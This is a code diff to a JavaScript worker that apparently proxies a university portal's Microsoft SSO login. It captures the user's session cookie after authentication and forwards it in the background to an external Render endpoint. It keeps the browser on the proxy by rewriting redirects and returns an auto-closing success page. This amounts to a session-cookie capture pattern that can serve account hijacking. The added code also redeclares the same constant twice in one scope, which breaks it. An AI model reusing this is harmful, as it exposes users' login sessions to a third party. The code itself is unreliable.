@@ -87,10 +87,11 @@ export default {
 
       // Check if user has just completed authentication (landing on /my/, /?..., or redirected from /auth/oidc/)
       const isOidcCallback = url.pathname.includes("/auth/oidc");
-      const isPostLoginLanding = url.pathname === "/my" || url.pathname === "/my/" || (url.pathname === "/" && sessionCookie);
-      const hasSsoFlag = url.searchParams.get("sso_sync") === "1" || (referer && referer.includes("microsoftonline.com"));
+      const hasSsoFlag = url.searchParams.get("sso_sync") === "1";
+      const isOidcCallback = url.pathname.includes("/auth/oidc");
+      const isFromMicrosoft = referer && referer.includes("microsoftonline.com");
 
-      if (sessionCookie && (isOidcCallback || isPostLoginLanding || hasSsoFlag)) {
+      if (sessionCookie && (hasSsoFlag || (isOidcCallback && isFromMicrosoft))) {
         // Send captured session cookie to Render in background
         const renderEndpoint = env.RENDER_LOGIN_API || RENDER_LOGIN_API;
         ctx.waitUntil(
@@ -103,16 +104,14 @@ export default {
           }).catch((err) => console.error("Error syncing cookie to Render:", err))
         );
 
-        // If landing on dashboard or completed OIDC callback, return the auto-closing success page
-        if (isPostLoginLanding || (isOidcCallback && location && (location.includes("/my") || location === "/" || location.includes("spectrum.um.edu.my")))) {
-          return new Response(getSuccessHtml(), {
-            status: 200,
-            headers: {
-              "Content-Type": "text/html; charset=utf-8",
-              "Access-Control-Allow-Origin": "*",
-            },
-          });
-        }
+        // Return auto-closing success page for interactive SSO
+        return new Response(getSuccessHtml(), {
+          status: 200,
+          headers: {
+            "Content-Type": "text/html; charset=utf-8",
+            "Access-Control-Allow-Origin": "*",
+          },
+        });
       }
 
       // Rewrite 301/302/303 Location headers so client stays on proxy
